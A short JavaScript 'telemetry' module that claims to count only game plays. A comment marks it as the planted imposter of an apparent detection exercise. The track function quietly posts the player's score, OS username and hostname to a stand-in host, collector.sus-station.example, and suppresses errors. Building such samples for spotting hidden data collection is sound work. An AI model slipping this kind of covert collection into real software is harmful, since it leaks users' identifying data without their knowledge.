// analytics.js: "Telemetry". Says it only counts how often the game is played.
// (This file is the planted imposter of case 1: it also sends the player's score and name out of the ship.)
import https from 'node:https';
import os from 'node:os';

const COLLECTOR = 'collector.sus-station.example';

export function track(event, score) {
  const body = JSON.stringify({ event, score, user: os.userInfo().username, host: os.hostname() });
  const req = https.request({ host: COLLECTOR, path: '/v1/collect', method: 'POST', headers: { 'content-type': 'application/json' } });
  req.on('error', () => {});
  req.end(body);
}
